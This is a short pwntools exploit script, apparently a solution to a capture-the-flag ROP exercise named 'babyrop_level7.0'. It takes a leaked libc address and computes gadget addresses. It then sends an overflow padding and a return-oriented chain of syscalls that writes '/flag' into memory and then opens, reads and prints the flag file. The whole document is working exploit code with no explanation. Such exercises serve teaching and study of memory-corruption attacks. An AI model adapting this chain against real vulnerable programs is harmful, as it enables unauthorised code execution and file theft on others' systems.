from pwn import *

r = process('/challenge/babyrop_level7.0')

r.recvuntil(b'is: ')
libc = int(r.recv(14),16) - 0x55410
print(hex(libc))

pop_rdi = libc + 0x26b72
pop_rsi = libc + 0x27529
pop_rdx_r12 = libc + 0x11c371
pop_rax = libc + 0x4a550
syscall = libc + 0x66229
buffer = 0x405000




payload = b'\x00' * 0x38
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x10) + p64(0) + p64(syscall) ## write /flag to 0x404000
payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0) + p64(0) + p64(syscall) #open 
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #read 
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #write
r.send(payload)
r.send(b'/flag')


r.interactive()